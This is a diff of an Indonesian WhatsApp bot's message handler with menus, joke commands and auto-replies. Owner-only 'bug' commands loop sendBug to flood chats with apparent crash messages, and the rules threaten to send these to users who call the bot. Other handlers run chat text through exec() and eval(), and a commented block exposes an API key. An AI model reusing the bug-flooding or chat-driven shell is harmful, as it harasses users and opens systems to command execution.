+*From :* ${pushname}
+
+ Info :  ${q}
+
+Total Member : ${groupMembers.length} 
+
+┏━⬣`+teks+`┗━⬣`, members_id, false)
+break
+
+
+case 'donasi':
+console.log('DONASI')
+xdev.sendMessage(from, donasi.dodo(prefix), text, {quoted: dev})
+break
+ 
+ 
+ case 'sayang':
+if(!autoWelcome){
+if(!isWelkom) return
+}
+if(isExtream) return
+sendMess(`Ciee di sayang\nUntuk @${q} kamu di sayang😘 sama ${pushname} awokawok`)
+break
+
+
+case 'peluk':
+if(!autoWelcome){ if(!isWelkom) return }
+if(isExtream) return
+sendMess(`Ciee di peluk\nuntuk @${q} kamu mau gak di peluk sama ${pushname} :v`)
+break
+
+case 'gebukin':
+if(!autoWelcome){
+if(!isWelkom) return
+ }
+if(isExtream) return
+setReply(`@${q} Berhasil di gebukin dan sekarang babak belur + bonyok :v`)
+break
+
+
+case 'pukulin':
+if(!autoWelcome){
+ if(!isWelkom) return
+}
+if(isExtream) return
+setReply(`@${q} Berhasil di pukulin dan sekarang dia bonyok-bonyok :v`)
+break
+
+case 'santet':
+if(!autoWelcome){
+if(!isWelkom) return
+ }
+if(isExtream) return
+setReply(`Berhasil menyantet si @${q} dan sekarang dia mencret paku`)
+break
+
+case 'kocok':
+if(!autoWelcome){
+if(!isWelkom) return
+}
+if(isExtream) return
+setReply(`*ERROR*`)
+break
+ 
+case "owner":
+stst = await xdev.getStatus(`${nomerOwner}@c.us`)
+stst = stst.status == 401 ? '' : stst.status
+sendKontak(from, nomerOwner, namalu, stst);
+break;
+ 
+ 
+case 'shorturl':
+case 'tinyurl':{
+if (args.length < 1) return setReply(`Masukkan link`)
+if (!isUrl) return setReply(`Masukkan link`)
+const fetchText = (url, optiono) => {
+return new Promise((resolve, reject) => {
+return fetch(url, optiono)
+.then(response => response.text())
+.then(text => resolve(text))
+.catch(err => {
+console.log(color(err,'red'))
+reject(err)
+})
+})
+}
+okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
+shorti = `*Result : ${okok}*`
+setReply(shorti)
+}
+break
+ 
+ 
+
+ 
+                 
+ 
+ 
+case 'sewabot':
+case 'sewalonte':
+case 'sewa':
+if(isExtream) return
+teks = sewabot.dada(prefix, settings, pushname, ucapanWaktu)      
+gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
+{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
+sendButLocation(from, teks,copyright, thumb, gbutsan)                          
+                         break
+ 
+
+case 'bug1':
+if (!isOwner) return setReply(mess.only.ownerB)
+if (args.length < 1) return setReply('Jumlahnya?')
+for (let i = 0; i < args[0]; i++) {
+xdev.toggleDisappearingMessages(from, 0)
+}
+setReply('Sukses send bug sebanyak '+args.join(' '))
+break
+
+
+
+/*
+case 'emojimix': {
+	        if (!q) setReply( `Example : ${prefix + command}`)
+		let [emoji1, emoji2] = q.split`+`
+		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
+		for (let res of anu.results) {
+		sendStickerUrl(from, res)
+		    await fs.unlinkSync(encmedia)
+		}
+	    }
+	    break
+*/
+
+case 'bug':
+if (!isOwner) return setReply(mess.only.ownerB)
+if (args.length < 1) return setReply('Jumlahnya?')
+for (let i = 0; i < args[0]; i++) {
+ sendBug(from)
+}
+setReply('Sukses send bug sebanyak '+args.join(' '))
+break
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+   
+
+ 
+ 
+default:
+                                                      
+if (isCmd && !multi && !allpref && !nopref && !isSimi || !isSimi && !allpref && !nopref && isCmd && multi && !dev.key.fromMe) {
+if(autovn){  
+sendvn(gakada)
+} else 
+if(autosticker) {
+const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
+                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
+                                           './respon/sticker10.webp',
+                                           './respon/sticker11.webp','./respon/sticker13.webp',
+                                           './respon/sticker21.webp']                   
+const su = kta[Math.floor(Math.random() * kta.length)]
+halo = fs.readFileSync(`${su}`)
+xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
+} else if(typing){
+setReply(textcmd )
+}
+}
+
+					
+//Simi simi            
+if(isGroup && isCmd && isSimi && !dev.key.fromMe && !isSticker && !isAudio && !isMedia ){
+simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
+sami = simi.success
+setReply(sami) 
+}
+
+}
+
+
+//-------------------BATAS GARIS KATULISTIWA-----------------\\
+
+
+	
+
+
+	
+//Waktu sewa group      
+if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
+await sendMess("Bye")
+setTimeout( () => {
+xdev.groupLeave(from)
+},4000)
+}
+	
+//Jika ada yg kirim pesan "p" botz akan respon
+if (salam.includes(messagesC)) {
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+if (isOwner) return 
+if(isExtream) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn){ 
+sendvn(ucapbot)
+} else if(autosticker) {
+sendSticker(ucapsalam)
+} else {
+setReply("Ucap salam napah")
+}
+}
+				
+//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
+if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn){
+sendvn(walaikumsalam)
+} else if(autosticker) {
+sendSticker1(kumsalam)
+} else {
+setReply("Walaikumsalam kak")
+}
+}
+				
+//Jika ada yg kirim pesan menu bot akan respon
+if (menu.includes(messagesC)) {
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+if (isOwner) return 
+setReply(`Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya 😉`)
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+}
+				
+//Jika ada yg toxic botz akan merespon✓
+if (!isOwner && bad.includes(messagesC)) {
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn){
+sendvn(astaga)
+} else if(autosticker) {
+await sendSticker(istigfar)
+} else {
+daui = await getBuffer('https://a.top4top.io/m_2213dvvcg0.mp3')
+await xdev.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true})
+await setReply("Astagfirloh oni chan")
+}
+}
+				
+//Jika ada yg bilang bot maka botz akan merespon✓
+if (badud.includes(messagesC)) {
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn ) {
+sendvn(ucapbot)
+} else {
+sendMess(hayuk)
+}
+}
+				
+//Jika ada yg bilang hallo maka botz akan merespon✓
+if (katahai.includes(messagesC)) {
+if(isExtream) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn) return sendvn(moshimos)
+}
+
+//Jika ada yang bilang ohayo bot akan merespon✓
+if(ohayo.includes(messagesC)){
+if(isExtream) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
+if(autovn === true) return sendvn(oahyo)
+setReply(`${ucapanWaktu} kak 🙂`)
+}
+				     
+ //Jika ada yang bilang oyasumi malem bot akan merespon✓
+if(katamalem.includes(messagesC)){
+if(isExtream) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
+if(autovn) {
+sendvn(oyasumi)
+} else {
+setReply(`${ucapanWaktu} kak 🙂`)
+}
+}
+          
+ //Jika ada yang bilang koniciwa malem bot akan merespon✓
+if(katasiang.includes(messagesC)){
+if(isExtream) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn) {
+sendvn(koniciwa)
+} else {
+setReply(`${ucapanWaktu} kak 🙂`)
+}
+}
+           
+ //Jika ada yang bilang lopyu bot akan merespon✓
+if(katalopyou.includes(messagesC)){
+if(isExtream) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autovn){
+sendvn(lopyoutoo)
+} else {
+setReply("??")
+}
+}
+				
+//Jika ada yg cek prefix bot akan merespon   
+if (budy.includes('ekprefix')){
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`, text, { quoted: setQuoted, contextInfo: forward })
+ }
+                   
+//Jika ada yang tag nomer owner
+if (!isOwner && isGroup && budy.includes(nomerOwner)) {
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+if (itsMe) return
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
+const su = kta[Math.floor(Math.random() * kta.length)]
+xdev.sendMessage(from, su, text, { quoted: dev })
+}
+					
+//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
+for (let kasih of thanks){
+ if (budy.includes(kasih) || selectedButton == 'Thanks' ) {
+if(isExtream) return
+if(dev.key.fromMe) return
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+if(autosticker) return sendSticker(samasama)
+setReply(`Sama sama kak ${pushname}`)
+}
+}
+                 
+
+//ketika ada yang invite/kirim link grup di chat pribadi
+//Di kasih ama Alyul
+if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
+if(budy.startsWith(`${prefix}freeoneday`)){
+console.log("freeoneday detected")
+} else {
+teks = "*Untuk memasukan bot ke group*\n*Kamu harus sewa bot telebih dahulu*\n\n" + sewabot.dada(prefix, settings, pushname, ucapanWaktu)
+gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
+{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
+sendButLocation(from, teks, `© ${fake1}`, thumb, gbutsan) 
+}
+}
+
+//Ketika ada yang minta save
+if(!isGroup && budy.startsWith("sv")){
+if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
+addSpam("NotCase",senderNumber, "10s", AntiSpam)
+setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
+}
+	
+	
+//Bullying member bamru
+if (body.startsWith(`${prefix}bullyuk`)){
+if(!autoWelcome){
+if(!isWelkom) return setReply("Error")
+}
+if(isExtream) return
+setReply(`Hayuk ah`)     
+sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
+{buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
+{buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
+{buttonId: `${prefix}${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
+} 
+
+
+
+//Info Botz
+if (selectedButton == 'INFO BOTZ') {
+if(isExtream) return       
+var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
+var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
+var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
+uptime = process.uptime();
+const timestampu = speed();
+var total = math(`${groups.length} ${privat.length}`)
+const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
+					
+menunya = info1.bot(calender, wa_version, mcc, mnc, os_version, device_manufacturer, device_model,os,ram2,privat,groups,totalchat,latensi,gender,fake,nomerOwner)
+let info = fs.readFileSync('./stik/bot.jpg')
+options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: fs.readFileSync('./stik/bot.jpg'), mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
+gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
+{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
+if(setmenu === "document") {
+Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), gbutsan, options2)
+} else  {
+sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), gbutsan, {contextInfo: forward})             
+}
+} 
+
+//Kode Qr
+if (selectedButton == 'KODE QR') {
+if(isExtream) return
+sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
+{buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
+{buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
+{buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
+} 
+
+//Developer
+if (selectedButton == 'DEVELOPER') {
+if(isExtream) return
+stst = await xdev.getStatus(`${Ownerin.split("@")[0]}@c.us`)
+stst = stst.status == 401 ? '' : stst.status
+yahu = xdev.contacts[Ownerin] != undefined ? xdev.contacts[Ownerin].notify = undefined ? PhoneNumber('+' + Ownerin.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[Ownerin].notify || xdev.contacts[Ownerin].vname : PhoneNumber('+' + Ownerin.replace('@s.whatsapp.net', '')).getNumber('international')
+sendKontak(from, `${Ownerin.split("@")[0]}`, yahu, stst);   
+setReply("Tuh developer aku\nIngat! dia tuh Developer bukan bot,\nDia yang memperbaikin semua fitur yang error,\nkalo ada fitur error bisa chat ke Developer atau pakai fitur reportbug") 
+} 
+
+//Youtube Channel
+ if (selectedButton == 'YOUTUBE') {
+ if(isExtream) return
+console.log('YOUTUBE')
+let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
+teks = `Nih youtube Developer aku 🤗\nLink: https://youtube.com/watch?v=TOmXzkWuCWk`
+nana = `https://i.ytimg.com/vi/TOmXzkWuCWk/mqdefault.jpg`
+foto = await getBuffer(nana)
+options1 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: foto, mediaUrl:`https://youtube.com/watch?v=TOmXzkWuCWk`}}}
+Sendbutdocument(from, teks,copyright, fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options1)
+}
+
+//Rules Bot
+if (selectedButton == 'RULES') {
+ teks =`
+Syarat dan Ketentuan menggunakan *${fake}*
+
+1. Nama dan nomer user ${fake}
+     akan Kami simpan di dalam 
+     server selama bot aktif
+     
+2. Data akan di hapus ketika bot Offline
+     atau di hapus oleh Owner Bot
+
+3. Kami tidak menyimpan gambar, 
+     video, file, audio, dan dokumen 
+     yang kamu kirim ke ${fake}
+     
+4. Kami tidak akan pernah meminta users 
+     untuk memberikan informasi pribadi
+     
+5. Jika menemukan Bug/Error silahkan 
+     langsung lapor ke Owner atau Developer
+     atau bisa juga memakai fitur _*reportbug*_
+     
+6. Beberapa fitur mungkin ada yang error, 
+     jadi tunggu sampai developer 
+     meperbaiki fitur tersebut
+         
+8. Bot ini sudah di lengkapi dengan
+     fitur _*Auto Report Bug*_ jika terjadi
+     error maka bot akan auto report ke
+     developer, terkecuali error yang
+     menyebabkan bot mati, maka user
+     harus lapor ke developer
+     
+7. Bot ini juga sudah di lengkapi dengan 
+     Fitur Anti Spam jika kamu terdeteksi 
+     melakukan spam, maka Bot tidak
+     akan menanggapi kamu selama 20 detik
+    
+9. User dilarang keras menelpon bot!
+     jika melanggar maka kamu akan terkena 
+     banned,block dan dikirim bug
+
+10. Bot tidak akan menanggapi user yang
+       meminta untuk di save nomernya`
+
+let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
+sendButLocation(from, teks, `© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), mok, {contextInfo: forward})             
+}
+
+
+//Exec
+if (budy.startsWith('$')){
+if (!dev.key.fromMe && !isOwner) return onlyOwner()
+qur = budy.slice(2)
+exec(qur, (err, stdout) => {
+if (err) return setReply(`${copyright}:~ ${err}`)
+if (stdout) {
+setReply(stdout)
+}
+})
+}
+
+//Evaluate
+if (budy.startsWith('>')){
+if (!dev.key.fromMe && !isOwner) return onlyOwner()
+try {
+return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
+} catch(err) {
+e = String(err)
+setReply(e)
+}
+}
+
+if (budy.startsWith('=>')){
+if (!isOwner && !dev.key.fromMe) return onlyOwner()
+var konsol = budy.slice(3)
+Return = (sul) => {
+var sat = JSON.stringify(sul, null, 2)
+bang = util.format(sat)
+if (sat == undefined){
+bang = util.format(sul)
+}
+return setReply(bang)
+}
+try {
+setReply(util.format(eval(`;(async () => { ${konsol} })()`)))
+console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+} catch(e){
+setReply(String(e))
+}
+}
+
+ 
+if (timeWib >= '04:00' && timeWib <= '04:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
+}
+if (timeWib >= '05:00' && timeWib <= '05:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
+}
+if (timeWib >= '06:00' && timeWib <= '06:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
+}
+if (timeWib >= '11:00' && timeWib <= '11:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
+}
+if (timeWib >= '12:00' && timeWib <= '12:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
+}
+if (timeWib >= '15:00' && timeWib <= '15:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
+}
+if (timeWib >= '18:00' && timeWib <= '18:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
+}
+if (timeWib >= '19:00' && timeWib <= '19:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
+}
+if (timeWib >= '20:00' && timeWib <= '20:10') {
+console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
+}
+if (timeWib >= '00:00' && timeWib <= '00:10') {
+console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
+}
+           
+
+
+		
+    } catch (e) {
+    e = String(e)  
+    if (!e.includes("this.isZero")) {
+    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
+    if(e.includes("BaileysError: Not expecting a response")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Sinyalnya jelek kak atau bisa juga\n               pesan sementara grup masih aktif\n\n© ${fake1}`)
+    if(e.includes("Error: read ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Yahaha pasti paket chat 🤣\n\n© ${fake1}`)
+    if(e.includes("Error: ENOENT: no such file or directory, open")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Ada yg eror nih kak, file tidak di temukan`)
+    if(e.includes("Error: Request failed with status code")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Maap, sudah melebihi batas permintaan\n\n© ${fake1}`)
+    await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    
+    if(e.includes("protocol")) return 
+    if(checkError(e, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
+    addError(e, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
+    if(autoblockcmd){        
+    addblockcmd(command,listcmdblock) 
+    await setReply("Command telah di block karena terjadi error")
+    }
+    if(autoReport){
+    await xdev.sendMessage(`${Ownerin}`,`*「 Laporan Bug New 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
+    await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
+    if(autoblockcmd) return
+    setTimeout( () => {
+	 xdev.sendMessage(from,"Laporan error telah dikirim ke developer",text)
+	},2000)
+	}
+    }
+    } 
+
+    
+
+
+                    
+      
+
+
+
+
+
+
+
+	} catch (e) {
+    e = String(e)
+    if (!e.includes("this.isZero")) {
+    if (!e.includes("jid is not defined")) {
+    console.log(color('Message Error : %s', 'white'), color(e, 'green'))
+    
+        }
+	// console.log(e)
+	}
+}
+}
+
+
+
+
+	
+    
